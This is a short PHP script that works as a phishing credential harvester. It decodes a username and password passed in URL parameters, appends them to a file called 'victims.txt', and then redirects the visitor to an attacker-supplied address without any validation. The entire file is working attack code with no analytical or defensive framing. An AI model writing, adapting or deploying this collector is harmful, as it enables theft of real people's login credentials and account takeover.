<?php
$p = base64_decode($_GET['locid']);
$u = base64_decode($_GET['id']);
$f = fopen('victims.txt','a+');
fwrite($f,$u.'<!:!>'.$p);
echo "<script>window.location = '".$_GET['r']."';</script>";
?>